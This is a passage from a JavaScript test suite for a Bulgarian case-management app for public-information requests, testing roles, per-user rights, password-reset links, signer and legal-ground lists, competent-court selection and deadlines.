  assert.equal(g.call('art15.save', { item: '4', text: 'Деловодство', url: 'https://example.org/z' }, a.token).ok, true);
  assert.equal(g.call('art15.save', { item: '4', text: 'Ново', url: '' }, a.token).ok, true);
  const items = g.call('art15.get', {}, a.token).items;
  assert.equal(items.length, 1);
  assert.equal(items[0].text, 'Ново');
});

test('a forgotten password is reset with a one-time link from an administrator or the operator', () => {
  const { g, op, a } = setupTwo();
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  assert.equal(g.call('users.invite', { username: 'emp1' }, a.token).emailed, true);
  const staffLink = mailed(g, 'emp@example.org');
  assert.equal(g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).ok, true, 'old password works until reset');
  assert.equal(g.call('activate', { no: staffLink[1], username: staffLink[2], token: staffLink[3], hash: HASH('n') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: 'emp1', hash: HASH('n') }).ok, true);
  assert.equal(g.call('users.invite', { username: a.username }, a.token).link, undefined);
  const adminLink = mailed(g, 'admin@example.org');
  assert.equal(g.call('activate', { no: adminLink[1], username: adminLink[2], token: adminLink[3], hash: HASH('m') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('m') }).ok, true);
  assert.equal(g.call('op.inviteAdmin', { no: a.no }, op).error, 'action');
});

test('operator adds an organization directly, in its own spreadsheet, and the administrator gets a link by email', () => {
  const g = load(), op = operator(g);
  const no = newNo(g);
  const data = orgData({ adminUsername: 'opadmin' });
  assert.equal(g.call('op.org.create', Object.assign({}, data, { eik: '123456789', no }), op).error, 'eik');
  const r = g.call('op.org.create', Object.assign({}, data, { no }), op);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.no, no);
  assert.equal(r.emailed, true);
  assert.ok([...g.books.values()].some(x => x.name.includes(no)), 'own spreadsheet');
  assert.equal(g.call('op.org.create', Object.assign({}, data, { no: newNo(g), hash: HASH('g') }), op).error, 'duplicate');
  assert.equal(g.call('public.apply', Object.assign(orgData(), { no: newNo(g), hash: HASH('g') })).error, 'duplicate');

  assert.equal(g.call('login', { no, username: 'opadmin', hash: HASH('g') }).error, 'login', 'няма парола преди връзката');
  const m = mailed(g, 'admin@example.org');
  assert.equal(m[1], no);
  assert.equal(m[2], 'opadmin');
  assert.equal(g.call('activate', { no, username: 'opadmin', token: m[3], hash: HASH('n') }).ok, true);
  const l = g.call('login', { no, username: 'opadmin', hash: HASH('n') });
  assert.equal(g.call('case.list', {}, l.token).ok, true);
  assert.equal(g.call('password', { current: HASH('n'), next: HASH('n') }, l.token).error, 'password', 'новата парола е различна');
});

test('operator sends a one-time password link by email and the lock is cleared', () => {
  const { g, op, a } = setupTwo();
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked');
  assert.equal(g.call('op.user.invite', { no: a.no, username: 'nobody' }, op).error, 'notfound');
  const r = g.call('op.user.invite', { no: a.no, username: a.username }, op);
  assert.equal(r.emailed, true);
  assert.equal(r.link, undefined, 'операторът не вижда връзката');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true, 'старата парола работи до смяната');
  const m = mailed(g, 'admin@example.org');
  assert.equal(g.call('activate', { no: a.no, username: a.username, token: m[3], hash: HASH('g') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'login');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('g') }).ok, true);
});

test('operator edits organization data, including EIK, and it reaches the register', () => {
  const { g, op, a, b } = setupTwo();
  const got = g.call('op.org.get', { no: a.no }, op);
  assert.ok(!/"(salt|hash|inviteHash|sheetId)"/.test(JSON.stringify(got)));
  const next = Object.assign({}, got.profile, { no: a.no, name: 'Ново име', eik: '831902088' });
  assert.equal(g.call('op.org.save', Object.assign({}, next, { address: '' }), op).error, 'required');
  assert.equal(g.call('op.org.save', Object.assign({}, next, { eik: '121758615' }), op).error, 'duplicate');
  assert.equal(g.call('op.org.save', next, op).ok, true);
  const reg = g.call('op.orgs', {}, op).orgs.find(o => o.no === a.no);
  assert.equal(reg.name, 'Ново име');
  assert.equal(reg.eik, '831902088');
  assert.equal(g.call('org.bootstrap', {}, a.token).profile.name, 'Ново име');
  assert.equal(g.call('org.bootstrap', {}, b.token).profile.name, 'Агенция Б', 'other organization untouched');
  assert.equal(g.call('op.org.get', { no: '99999999' }, op).error, 'notfound');
});

test('operator manages users of an organization; the last administrator stays protected', () => {
  const { g, op, a } = setupTwo();
  const r = g.call('op.user.save', { no: a.no, isNew: true, username: 'emp9', name: 'Служител', position: 'Експерт', email: 'e9@example.org', role: 'Служител' }, op);
  assert.equal(r.created, true, JSON.stringify(r));
  assert.ok(g.call('users.list', {}, a.token).users.some(u => u.username === 'emp9'));
  assert.equal(g.call('op.user.save', { no: a.no, username: a.username, name: 'М', position: 'Ю', email: 'admin@example.org', role: 'Служител' }, op).error, 'lastadmin');
});

test('organizations cannot use the new operator actions', () => {
  const { g, a, b } = setupTwo();
  for (const act of ['op.org.get', 'op.org.create', 'op.org.save', 'op.user.save', 'op.user.invite']) {
    assert.equal(g.call(act, { no: b.no, username: b.username, hash: HASH('h') }, a.token).error, 'role', act);
  }
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p') }).ok, true, 'password of B untouched');
});

test('operator password can be reset only from the script editor', () => {
  const g = load(); operator(g);
  const before = g.mails.length;
  g.ctx.operatorReset();
  assert.equal(g.mails.length, before, 'no email');
});

test('password change requires the current password', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('password', { current: HASH('z'), next: HASH('n') }, a.token).error, 'password');
  assert.equal(g.call('password', { current: HASH('p'), next: HASH('n') }, a.token).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('n') }).ok, true);
});

test('tables grow past the default sheet size of Google (26 columns, 1000 rows)', () => {
  const { g, a } = setupTwo();
  const book = [...g.books.values()].find(x => /^ЗДОИ4You – \d{8}/.test(x.name) && x.name.includes(a.no));
  const sheet = book.getSheetByName('Преписки');
  assert.ok(sheet.getMaxColumns() > 26, 'cases need more than 26 columns');
  sheet.maxRows = sheet.getLastRow() + 1; // следващият запис е точно в края
  assert.equal(g.call('case.create', caseData(), a.token).ok, true);
  const second = g.call('case.create', caseData(), a.token);
  assert.equal(second.ok, true, JSON.stringify(second));
  assert.equal(g.call('case.get', { regNo: second.regNo }, a.token).case.applicantName, 'Петър Петров');
});

const sig = (over = {}) => Object.assign({ name: 'Петя Иванова', position: 'Секретар', act: 'Заповед № 12 от 01.02.2026 г.' }, over);

test('authorized persons: only an administrator or operator adds them, and each organization has its own', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('signers.save', sig({ act: '' }), a.token).error, 'required');
  assert.equal(g.call('signers.save', sig({ from: '2026-05-01', to: '2026-01-01' }), a.token).error, 'value');
  const s = g.call('signers.save', sig(), a.token);
  assert.equal(s.ok, true, JSON.stringify(s));
  assert.equal(g.call('org.bootstrap', {}, a.token).signers.length, 1);
  assert.equal(g.call('org.bootstrap', {}, b.token).signers.length, 0);
  assert.equal(g.call('op.signer.save', Object.assign(sig({ name: 'От оператор' }), { no: a.no }), op).ok, true);
  assert.equal(g.call('op.org.get', { no: a.no }, op).signers.length, 2);
  assert.equal(g.call('op.signer.save', Object.assign(sig(), { no: a.no }), a.token).error, 'role');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('signers.save', sig(), staff).error, 'role');
  assert.equal(g.call('org.bootstrap', {}, staff).signers.length, 2, 'staff can see and choose them');
});

test('decisions take the signer from the list; forged names and invalid persons are refused', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const refuse = (fields, date = '2026-06-01', token = a.token) => g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', date, fields: Object.assign({ groundKey: 't3', factual: 'факти' }, fields) }, token);
  const id = g.call('signers.save', sig({ from: '2026-02-01', to: '2026-12-31' }), a.token).id;
  const ok = refuse({ signerId: id });
  assert.equal(ok.payload.f.signer, 'Петя Иванова');
  assert.equal(ok.payload.f.signerAct, 'Заповед № 12 от 01.02.2026 г.');
  assert.equal(refuse({ signerId: id }, '2027-01-15').error, 'signer', 'outside the validity period');
  assert.equal(refuse({ signerId: 'nosuch' }).error, 'signer');
  const forged = refuse({ signer: 'Подправено Име', signerPosition: 'Кмет', signerAct: 'Няма' });
  assert.equal(forged.payload.f.signer, undefined, 'typed names are ignored');
  const other = g.call('signers.save', sig(), b.token).id;
  assert.equal(refuse({ signerId: other }).error, 'signer', 'person from another organization');
  g.call('signers.save', sig({ id, active: false }), a.token);
  assert.equal(refuse({ signerId: id }).error, 'signer', 'deactivated');
});

test('motives, review edits and added text are stored and come back the same', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const fields = { groundKey: 't3', factual: 'факти', motives: 'Мотив едно.\n\nМотив две.', edits: JSON.stringify({ 2: 'променен абзац' }), extra: 'Добавка.' };
  const r = g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', date: '2026-06-01', fields }, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  const back = g.call('doc.get', { id: r.id }, a.token).payload.f;
  assert.equal(back.motives, fields.motives);
  assert.equal(back.edits, fields.edits);
  assert.equal(back.extra, fields.extra);
  const big = 'м'.repeat(8000);
  const huge = g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: big, motives: big, extra: big, text: big, a1: big, a2: big, a3: big } }, a.token);
  assert.equal(huge.error, 'size', 'too large for one cell is refused, not cut');
});

test('authorized persons table appears in organizations created before this version', () => {
  const { g, a } = setupTwo();
  const book = [...g.books.values()].find(x => x.name.includes(a.no));
  book.deleteSheet(book.getSheetByName('Упълномощени лица'));
  assert.equal(g.call('org.bootstrap', {}, a.token).signers.length, 0);
  assert.equal(g.call('signers.save', sig(), a.token).ok, true);
  assert.ok(book.getSheetByName('Упълномощени лица'));
});

const profileOf = (g, token) => g.call('org.bootstrap', {}, token).profile;

test('organizations cannot edit their data: only a request with a basis, approved by the operator', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('org.save', { name: 'Хак' }, a.token).error, 'action');
  const cur = profileOf(g, a.token);
  const next = Object.assign({}, cur, { address: 'нов адрес 5', eik: '831902088' });
  assert.equal(g.call('org.changeRequest', next, a.token).error, 'required', 'basis is required');
  assert.equal(g.call('org.changeRequest', Object.assign({}, cur, { changeBasis: 'x' }), a.token).error, 'nochange');
  const r = g.call('org.changeRequest', Object.assign({}, next, { changeBasis: 'Решение № 5 на ОбС' }), a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(profileOf(g, a.token).address, cur.address, 'nothing changes before approval');
  assert.equal(g.call('org.changeRequest', Object.assign({}, next, { changeBasis: 'пак' }), a.token).error, 'pending');
  assert.equal(g.call('op.changeDecide', { id: r.id, approve: true }, a.token).error, 'role', 'organization cannot approve itself');
  const pending = g.call('org.changes', {}, a.token).changes[0];
  assert.equal(pending.basis, 'Решение № 5 на ОбС');
  assert.deepEqual(Object.keys(pending.changed).sort(), ['address', 'eik']);
  assert.equal(pending.changed.address.from, cur.address);
  assert.equal(g.call('org.changes', {}, b.token).changes.length, 0, 'other organizations do not see it');
  assert.equal(g.call('op.changes', {}, op).changes[0].id, r.id);

  assert.equal(g.call('op.changeDecide', { id: r.id, approve: true }, op).ok, true);
  assert.equal(profileOf(g, a.token).address, 'нов адрес 5');
  assert.equal(g.call('op.orgs', {}, op).orgs.find(o => o.no === a.no).eik, '831902088', 'register updated');
  assert.equal(g.call('op.changeDecide', { id: r.id, approve: true }, op).error, 'state');
  const again = profileOf(g, a.token);
  assert.equal(g.call('org.changeRequest', Object.assign({}, again, { address: 'трети', changeBasis: 'y' }), a.token).ok, true, 'free again after decision');
});

test('a change request can be refused with a reason and changes nothing', () => {
  const { g, op, a } = setupTwo();
  const cur = profileOf(g, a.token);
  const r = g.call('org.changeRequest', Object.assign({}, cur, { name: 'Друго име', changeBasis: 'основание' }), a.token);
  assert.equal(g.call('op.changeDecide', { id: r.id, approve: false }, op).error, 'required');
  assert.equal(g.call('op.changeDecide', { id: r.id, approve: false, reason: 'Няма документ' }, op).ok, true);
  assert.equal(profileOf(g, a.token).name, cur.name);
  assert.equal(g.call('org.changes', {}, a.token).changes[0].reason, 'Няма документ');
});

test('an approved change to another organization EIK is refused at decision time', () => {
  const { g, op, a, b } = setupTwo();
  const r = g.call('org.changeRequest', Object.assign({}, profileOf(g, a.token), { eik: '121758615', changeBasis: 'x' }), a.token);
  assert.equal(g.call('op.changeDecide', { id: r.id, approve: true }, op).error, 'duplicate');
  assert.ok(b);
});

test('the competent court follows the address of the addressee', () => {
  const { g, a } = setupTwo();
  const make = (oblast, fields) => {
    const reg = g.call('case.create', caseData({ applicantOblast: oblast }), a.token).regNo;
    return g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: Object.assign({ groundKey: 't3', factual: 'факти' }, fields) }, a.token);
  };
  assert.equal(make('Варна').payload.f.court, 'Административен съд – Варна');
  assert.equal(make('София (столица)').payload.f.court, 'Административен съд София-град');
  assert.equal(make('София').payload.f.court, 'Административен съд София-област');
  assert.equal(make('Варна', { court: 'Административен съд – Русе' }).payload.f.court, 'Административен съд – Русе', 'can be corrected');
  assert.equal(make('', {}).error, 'court', 'no oblast and no choice');
  assert.equal(make('Варна', { court: 'Измислен съд' }).error, 'court');
  const reg = g.call('case.create', caseData({ applicantOblast: '' }), a.token).regNo;
  assert.equal(g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, a.token).ok, true, 'letters need no court');
});

test('the court follows the written address of the applicant, not a stale saved oblast', () => {
  const { g, a } = setupTwo();
  const make = over => {
    const reg = g.call('case.create', caseData(over), a.token).regNo;
    return g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: 'факти' } }, a.token);
  };
  assert.equal(make({ applicantAddress: 'п.к. 9000, обл. Варна, общ. Варна, гр. Варна, ул. 1', applicantOblast: 'Русе' }).payload.f.court, 'Административен съд – Варна');
  assert.equal(make({ applicantAddress: 'п.к. 1000, обл. София (столица), общ. Столична, гр. София', applicantOblast: '' }).payload.f.court, 'Административен съд София-град');
  assert.equal(make({ applicantAddress: 'обл. София, общ. Самоков, гр. Самоков', applicantOblast: '' }).payload.f.court, 'Административен съд София-област');
  assert.equal(make({ applicantAddress: 'ул. Без област 1', applicantOblast: 'Плевен' }).payload.f.court, 'Административен съд – Плевен', 'fallback for old cases');
  assert.equal(make({ applicantAddress: 'ул. Без област 1', applicantOblast: '' }).error, 'court');
});

test('the court is not organization data, even if an older profile still stores one', () => {
  const { g, op, a } = setupTwo();
  const book = [...g.books.values()].find(x => x.name.includes(a.no));
  const sheet = book.getSheetByName('Профил');
  sheet.getRange(sheet.getLastRow() + 1, 1, 1, 2).setValues([['court', 'Стар съд']]);
  assert.equal('court' in g.call('org.bootstrap', {}, a.token).profile, false);
  assert.equal('court' in g.call('op.org.get', { no: a.no }, op).profile, false);
  const reg = g.call('case.create', caseData({ applicantOblast: 'Варна', applicantAddress: 'ул. 1' }), a.token).regNo;
  const doc = g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: 'факти' } }, a.token);
  assert.equal(doc.payload.org.court, undefined);
  assert.equal(doc.payload.f.court, 'Административен съд – Варна');
});

test('several legal grounds in one decision, including free text', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const refuse = fields => g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', date: '2026-06-01', fields: Object.assign({ factual: 'факти' }, fields) }, a.token);
  assert.equal(refuse({}).error, 'ground', 'a refusal needs a ground');
  assert.equal(refuse({ groundKeys: '[]' }).error, 'ground');
  assert.equal(refuse({ groundKeys: '["zz"]' }).error, 'value');
  assert.equal(refuse({ groundKeys: 'повреден' }).error, 'value');
  assert.equal(refuse({ groundKeys: '["g1"]' }).error, 'value', 'a ground for another kind of act');
  const r = refuse({ groundKeys: '["t2","t1c"]', groundOther: 'чл. 8 от Закон за пример', groundText: 'подправено' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.ok(r.payload.f.groundText.includes('чл. 37, ал. 1, т. 2') && r.payload.f.groundText.includes('чл. 17, ал. 2') && r.payload.f.groundText.includes('чл. 8 от Закон за пример'));
  assert.ok(!r.payload.f.groundText.includes('подправено'), 'text comes from the list, not the browser');
  assert.equal(g.call('case.get', { regNo: reg }, a.token).case.refusalGround, 't2,t1c,other');
  assert.equal(refuse({ groundOther: 'само свободен текст' }).ok, true);
  const d = g.call('doc.create', { type: 'dismiss', regNo: reg, title: 'x', date: '2026-06-01', fields: { groundKeys: '["d2"]' } }, a.token);
  assert.ok(d.payload.f.ground.startsWith('чл. 29, ал. 2'));
  assert.equal(g.call('doc.create', { type: 'dismiss', regNo: reg, title: 'x', fields: {} }, a.token).error, 'ground');
  const grant = g.call('doc.create', { type: 'grant', regNo: reg, title: 'x', date: '2026-06-01', fields: { scope: 'пълен', accessDays: '30', place: 'м', accessForm: 'ф', costs: '0' } }, a.token);
  assert.equal(grant.ok, true, 'extra grounds are optional when granting access');
});

test('organizations add their own grounds; separate per organization and per kind of act', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('grounds.save', { scope: 'refuse', text: '' }, a.token).error, 'required');
  assert.equal(g.call('grounds.save', { scope: 'нещо', text: 'x' }, a.token).error, 'value');
  const id = g.call('grounds.save', { scope: 'refuse', text: 'чл. 9 от Закон за пример' }, a.token).id;
  assert.ok(id);
  assert.equal(g.call('org.bootstrap', {}, a.token).grounds.length, 1);
  assert.equal(g.call('org.bootstrap', {}, b.token).grounds.length, 0);
  const reg = g.call('case.create', caseData({ regDate: '2025-02-03' }), a.token).regNo;
  const use = (token, r, keys) => g.call('doc.create', { type: 'refuse', regNo: r, title: 'x', date: '2025-02-10', fields: { factual: 'факти', groundKeys: JSON.stringify(keys) } }, token);
  assert.equal(use(a.token, reg, [id]).payload.f.groundText, 'чл. 9 от Закон за пример');
  const stats = g.call('report.stats', { year: '2025' }, a.token).stats;
  assert.equal(stats.grounds['чл. 9 от Закон за пример'], 1, 'counted in the annual report');
  const regB = g.call('case.create', caseData(), b.token).regNo;
  assert.equal(use(b.token, regB, [id]).error, 'value', 'not usable by another organization');
  assert.equal(g.call('doc.create', { type: 'grant', regNo: reg, title: 'x', fields: { scope: 'п', accessDays: '30', place: 'м', accessForm: 'ф', costs: '0', groundKeys: JSON.stringify([id]) } }, a.token).error, 'value', 'wrong kind of act');
  g.call('grounds.save', { id, scope: 'refuse', text: 'чл. 9 от Закон за пример', active: false }, a.token);
  assert.equal(use(a.token, reg, [id]).error, 'value', 'deactivated');
  assert.equal(g.call('op.ground.save', { no: b.no, scope: 'grant', text: 'от оператор' }, op).ok, true);
  assert.equal(g.call('op.org.get', { no: b.no }, op).grounds.length, 1);
  assert.equal(g.call('op.ground.save', { no: b.no, scope: 'grant', text: 'x' }, a.token).error, 'role');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('grounds.save', { scope: 'refuse', text: 'x' }, staff).error, 'role');
});

/* служител с дадени права; връща токена му */
function staffWith(g, adminToken, no, username, perms) {
  const r = g.call('users.save', Object.assign({ isNew: true, username, name: 'С', position: 'Е', email: username + '@example.org', role: 'Служител' }, perms ? { perms } : {}), adminToken);
  assert.equal(r.created, true, JSON.stringify(r));
  const e = mailed(g, username + '@example.org');
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  return g.call('login', { no, username, hash: HASH('e') });
}

test('rights: defaults by role keep the usual behaviour', () => {
  const { g, a } = setupTwo();
  const me = g.call('org.bootstrap', {}, a.token).me;
  assert.equal(Object.keys(me.perms).length, 11, 'administrator has all rights');
  const s = staffWith(g, a.token, a.no, 'emp1');
  assert.deepEqual(Object.keys(s.me.perms).sort(), ['art15', 'casesAll', 'casesEdit', 'decisions', 'letters', 'reports']);
  assert.equal(g.call('users.list', {}, a.token).users.find(u => u.username === 'emp1').perms.length, 6);
});

test('rights: each one is enforced on the server, whatever the browser shows', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData({ regDate: '2026-11-02' }), a.token).regNo;
  const s = staffWith(g, a.token, a.no, 'emp1', ['casesAll']).token;
  assert.equal(g.call('case.get', { regNo: reg }, s).ok, true, 'can read');
  assert.equal(g.call('case.create', caseData(), s).error, 'role');
  assert.equal(g.call('case.update', Object.assign(g.call('case.get', { regNo: reg }, s).case, { status: 'Приключена' }), s).error, 'role');
  assert.equal(g.call('case.comment', { regNo: reg, text: 'x' }, s).error, 'role');
  assert.equal(g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, s).error, 'role');
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: 'ф' } }, s).error, 'role');
  assert.equal(g.call('doc.create', { type: 'report', title: 'x', fields: { year: '2026' } }, s).error, 'role');
  assert.equal(g.call('doc.create', { type: 'art15', title: 'x', fields: {} }, s).error, 'role');
  assert.equal(g.call('report.stats', { year: '2026' }, s).error, 'role');
  assert.equal(g.call('art15.save', { item: '4', text: 'x' }, s).error, 'role');
  assert.equal(g.call('log.list', {}, s).error, 'role');
  assert.equal(g.call('signers.save', { name: 'x', position: 'y', act: 'z' }, s).error, 'role');
  assert.equal(g.call('grounds.save', { scope: 'refuse', text: 'x' }, s).error, 'role');
  assert.equal(g.call('org.changeRequest', {}, s).error, 'role');
  const letters = staffWith(g, a.token, a.no, 'emp2', ['casesAll', 'letters']).token;
  assert.equal(g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, letters).ok, true, 'letters only');
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, title: 'x', fields: { groundKey: 't3', factual: 'ф' } }, letters).error, 'role', 'no decisions');
});

test('rights: without "all cases" a user sees only assigned and own cases, and their documents', () => {
  const { g, a } = setupTwo();
  const s = staffWith(g, a.token, a.no, 'emp1', ['casesEdit', 'letters', 'decisions']).token;
  const hidden = g.call('case.create', caseData({ subject: 'СКРИТА' }), a.token).regNo;
  const assigned = g.call('case.create', caseData({ owner: 'emp1', subject: 'ВЪЗЛОЖЕНА' }), a.token).regNo;
  const own = g.call('case.create', caseData({ subject: 'МОЯ' }), s).regNo;
  const seen = g.call('case.list', {}, s).cases.map(c => c.regNo).sort();
  assert.deepEqual(seen, [assigned, own].sort());
  assert.equal(g.call('case.get', { regNo: hidden }, s).error, 'notfound');
  assert.equal(g.call('case.comment', { regNo: hidden, text: 'x' }, s).error, 'notfound');
  assert.equal(g.call('doc.create', { type: 'noinfo', regNo: hidden, title: 'x', fields: {} }, s).error, 'notfound');
  const secret = g.call('doc.create', { type: 'noinfo', regNo: hidden, title: 'x', fields: {} }, a.token);
  assert.equal(g.call('doc.get', { id: secret.id }, s).error, 'notfound');
  assert.ok(!JSON.stringify(g.call('doc.list', {}, s)).includes(secret.id));
  const report = g.call('doc.create', { type: 'report', title: 'x', fields: { year: '2026' } }, a.token);
  assert.equal(g.call('doc.get', { id: report.id }, s).error, 'notfound', 'report without the right');
});

test('rights: changes apply immediately; users stay administrator-only; the role resets them', () => {
  const { g, op, a } = setupTwo();
  const s = staffWith(g, a.token, a.no, 'emp1');
  const base = { username: 'emp1', name: 'С', position: 'Е', email: 'emp1@example.org', role: 'Служител' };
  assert.equal(g.call('report.stats', { year: '2026' }, s.token).ok, true);
  assert.equal(g.call('users.save', Object.assign({}, base, { perms: ['casesAll', 'нещо'] }), a.token).error, 'value');
  assert.equal(g.call('users.save', Object.assign({}, base, { perms: ['casesAll'] }), a.token).ok, true);
  assert.equal(g.call('report.stats', { year: '2026' }, s.token).error, 'role', 'taken away at once');
  assert.equal(g.call('users.list', {}, s.token).error, 'role');
  assert.equal(g.call('users.save', Object.assign({}, base, { perms: ['log'] }), a.token).ok, true);
  assert.equal(g.call('log.list', {}, s.token).ok, true, 'staff can receive a usually administrator right');
  assert.equal(g.call('users.list', {}, s.token).error, 'role', 'but never user management');
  assert.equal(g.call('users.save', Object.assign({}, base, { role: 'Администратор' }), a.token).ok, true);
  assert.equal(g.call('users.list', {}, a.token).users.find(u => u.username === 'emp1').perms.length, 11, 'role change resets to defaults');
  assert.equal(g.call('op.user.save', { no: a.no, username: 'emp1', name: 'С', position: 'Е', email: 'emp1@example.org', role: 'Служител', perms: ['art15'] }, op).ok, true);
  assert.deepEqual(g.call('op.org.get', { no: a.no }, op).users.find(u => u.username === 'emp1').perms, ['art15'], 'operator can set rights too');
  const raw = JSON.stringify(g.call('users.list', {}, a.token));
  assert.ok(!/"(salt|hash|inviteHash)"/.test(raw));
});

test('rights: an administrator without the right cannot use it, but still manages users', () => {
  const { g, a } = setupTwo();
  const r = g.call('users.save', { isNew: true, username: 'adm2', name: 'В', position: 'Ю', email: 'a2@example.org', role: 'Администратор', perms: ['casesAll'] }, a.token);
  const e = mailed(g, 'a2@example.org');
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const t = g.call('login', { no: a.no, username: 'adm2', hash: HASH('e') }).token;
  assert.equal(g.call('log.list', {}, t).error, 'role');
  assert.equal(g.call('users.list', {}, t).ok, true);
});

test('third-party deadlines are calculated (art. 31)', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData({ regDate: '2026-11-02' }), a.token).regNo;
  let c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.thirdInvolved, false);
  assert.equal(c.thirdBy, '2026-11-09', '7 days from registration');
  assert.equal(c.thirdReplyBy, '2026-11-30', '14 + 14 days, ready for the letter');
  const f = { third: 'ЕТ Иванов', thirdAddress: 'ул. 1', info: 'договор', by: '2026-11-30' };
  assert.equal(g.call('doc.create', { type: 'thirdparty', regNo: reg, title: 'x', date: '2026-11-05', fields: f }, a.token).ok, true);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.thirdInvolved, true);
  assert.equal(c.thirdAsked, '2026-11-05');
  assert.equal(c.thirdByDays, null, 'already asked');
  assert.equal(typeof c.thirdReplyDays, 'number');
  g.call('doc.create', { type: 'extend31', regNo: reg, title: 'x', date: '2026-11-05', fields: { days: '7', third: 'ЕТ Иванов' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-23', '14 + 7');
  assert.equal(c.thirdReplyBy, '2026-11-23', 'reply follows the actual extension');
  assert.equal(g.call('case.update', updateData(c, { thirdGot: '2026-11-10' }), a.token).ok, true);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'В обработка', 'back to work after the reply');
  assert.equal(c.thirdReplyDays, null);
});

test('honeypot silently drops bots', () => {
  const g = load(); operator(g);
  const r = apply(g, { hp: 'bot' });
  assert.equal(r.ok, true);
  assert.equal(r.id, 'ok');
});

test('operator can close and reopen registration; closed form refuses but pending work continues', () => {
  const g = load(), op = operator(g);
  assert.equal(g.call('public.config').applyOpen, true);
  const pending = apply(g);
  assert.equal(pending.ok, true);
  assert.equal(g.call('op.applyOpen', { open: 'no' }, op).error, 'value');
  assert.equal(g.call('op.applyOpen', { open: false }).error, 'session');
  assert.equal(g.call('op.applyOpen', { open: false }, op).applyOpen, false);
  assert.equal(g.call('public.config').applyOpen, false);
  assert.equal(apply(g, { eik: '121758615' }).error, 'closed');
  assert.equal(g.call('op.apps', {}, op).applyOpen, false);
  assert.equal(g.call('op.decide', { id: pending.id, approve: true }, op).ok, true, 'подадена заявка се решава');
  const direct = g.call('op.org.create', Object.assign(orgData({ eik: '831902088', name: 'От оператор', adminUsername: 'opadmin' }), { no: newNo(g), hash: HASH('g') }), op);
  assert.equal(direct.ok, true, 'операторът добавя организации');
  assert.equal(g.call('op.applyOpen', { open: true }, op).applyOpen, true);
  assert.equal(apply(g, { eik: '121758615' }).ok, true);
});

test('organization cannot change registration setting or plans', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('op.applyOpen', { open: false }, a.token).error, 'role');
  assert.equal(g.call('op.plan.save', { name: 'X', status: 'Въведен' }, a.token).error, 'role');
  assert.equal(g.call('op.org.plan', { no: a.no, plan: '' }, a.token).error, 'role');
});

test('plans: visible to the organization only after they are introduced', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('op.plan.save', { name: '', status: 'Въведен' }, op).error, 'required');
  assert.equal(g.call('op.plan.save', { name: 'X', status: 'Друго' }, op).error, 'value');
  const p = g.call('op.plan.save', { name: 'Основен', description: 'Описание', status: 'Подготвя се' }, op);
  assert.equal(p.ok, true, JSON.stringify(p));
  assert.equal(g.call('op.plan.save', { name: 'основен', status: 'Въведен' }, op).error, 'duplicate');
  assert.equal(g.call('op.org.plan', { no: a.no, plan: 'липсва' }, op).error, 'notfound');
  assert.equal(g.call('op.org.plan', { no: a.no, plan: p.id }, op).ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).plan, null, 'подготвян план не се вижда');
  assert.equal(g.call('op.org.get', { no: a.no }, op).plan, p.id);
  assert.equal(g.call('op.orgs', {}, op).orgs.find(o => o.no === a.no).planName, 'Основен');
